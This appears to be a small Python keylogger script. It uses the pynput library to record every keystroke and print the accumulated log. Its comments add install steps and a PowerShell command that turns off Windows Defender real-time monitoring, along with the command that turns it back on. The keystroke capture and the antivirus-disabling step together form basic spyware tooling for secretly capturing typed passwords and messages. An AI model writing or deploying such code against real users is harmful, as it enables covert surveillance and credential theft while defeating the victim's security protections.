#!/usr/bin/sh python

import pynput.keyboard

log = ""


def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
        print(log)
    except AttributeError:
        log = log + " " + str(key) + " "
        print(log)


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)


with keyboard_listener:
    keyboard_listener.join()


# killall python

# need to install pynput in command
# pip install pynput


# Run powershell as administrator
# To disable Windows Defender:
# Set-MpPreference -DisableRealtimeMonitoring $true

# To enable Window Defender:
# Set-MpPreference -DisableRealtimeMonitoring $false